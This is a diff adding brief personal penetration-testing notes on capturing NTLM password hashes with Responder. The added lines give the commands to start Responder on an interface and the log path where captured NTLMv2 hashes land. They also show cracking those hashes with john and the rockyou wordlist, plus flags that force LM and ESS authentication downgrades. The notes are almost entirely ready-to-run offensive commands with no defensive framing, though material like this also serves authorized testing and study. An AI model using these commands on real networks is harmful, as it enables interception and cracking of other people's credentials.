@@ -1,3 +1,16 @@
 Use responder to capture password hashes of network 
 Looking for NTLM hashes 
 
+sudo responder -I eth0 (luanch responder) 
+/usr/share/responder/Logs contain a file SMB-NTLMv2-SSP..... with the hashes
+john SMB-NTLMv2_SSP..... --wordlist=/usr/...../rockyou.txt    (will work if lucky probably not)
+
+NTLMv1 Downgrade
+sudo responder -I eth0 --lm -v
+lm - lm downgrade
+
+sudo responder -I eth0 --disable-ess -v
+disable-ess - ess downgrade/remove
+
+
+
